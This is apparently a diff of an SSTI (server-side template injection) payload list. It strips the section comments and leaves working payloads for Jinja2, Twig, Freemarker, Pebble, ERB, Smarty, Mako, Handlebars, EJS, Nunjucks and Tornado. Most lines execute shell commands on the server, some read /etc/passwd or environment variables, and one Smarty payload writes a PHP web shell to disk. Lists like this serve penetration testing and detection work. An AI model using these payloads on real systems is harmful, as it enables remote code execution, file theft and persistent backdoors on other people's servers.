@@ -1,24 +1,16 @@
-# ============================================================
-# SSTI — Server-Side Template Injection
-# ============================================================
-
-# ---- Detection Polyglot ----
 {{7*7}}
 ${7*7}
-#{7*7}
 <%= 7*7 %>
 *{7*7}
 ${{7*7}}
 {{7*'7'}}
 ${{"7"*7}}
-#{"7"*7}
 [[7*7]]
 {% 7*7 %}
 {7*7}
 @(7*7)
 $[7*7]
 
-# ---- Jinja2 ----
 {{config}}
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{config.items()}}
@@ -32,7 +24,6 @@ $[7*7]
 {{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
 {{lipsum.__globals__['os'].popen('sleep 5').read()}}
 
-# ---- Twig ----
 {{_self.env.getExtensions()}}
 {{dump(_context)}}
 {{app.request}}
@@ -42,29 +33,17 @@ $[7*7]
 {{['id','']|sort('system')}}
 {{'id'|filter('system')}}
 
-# ---- Freemarker ----
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${product.getClass().forName("java.lang.Runtime").getMethod("exec",String.class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
 <#assign ex="freemarker.template.utility.Execute"?new()><#assign x=ex("id")>${x}
 ${.data_model}
 
-# ---- Velocity ----
-#set($x = 7*7)$x
-#set($rt = $class.forName('java.lang.Runtime'))
-#set($proc = $rt.exec("id"))
-#set($is = $proc.getInputStream())
-#set($reader = $class.forName('java.io.InputStreamReader').getDeclaredConstructors()[0])
-#set($res = $reader.newInstance($is))
-#set($sbr = $class.forName('java.io.BufferedReader').getDeclaredConstructors()[0])
-#set($buf = $sbr.newInstance($res))
 $buf.readLine()
 
-# ---- Pebble ----
 {% set cmd = "id" %}
 {% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
 {{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance([bytes]) }}
 
-# ---- ERB ----
 <%= system("id") %>
 <%= `id` %>
 <%= IO.popen("id").read %>
@@ -72,13 +51,11 @@ $buf.readLine()
 <%= ENV %>
 <%= File.read('/etc/passwd') %>
 
-# ---- Smarty ----
 {$smarty.version}
 {math equation="7*7"}
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
 
-# ---- Mako ----
 ${__import__('os').popen('id').read()}
 <%
     import os
@@ -86,7 +63,6 @@ ${__import__('os').popen('id').read()}
 %>
 ${x}
 
-# ---- Handlebars ----
 {{this}}
 {{#with "s" as |string|}}
   {{#with "e"}}
@@ -108,15 +84,11 @@ ${x}
   {{/with}}
 {{/with}}
 
-# ---- EJS ----
 <%= global.process.mainModule.require('child_process').execSync('id') %>
 
-# ---- Nunjucks ----
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
 
-# ---- Go Templates ----
 {{.}}
 {{printf "%s" .}}
 
-# ---- Tornado ----
 {% import os %}{{os.popen("id").read()}}
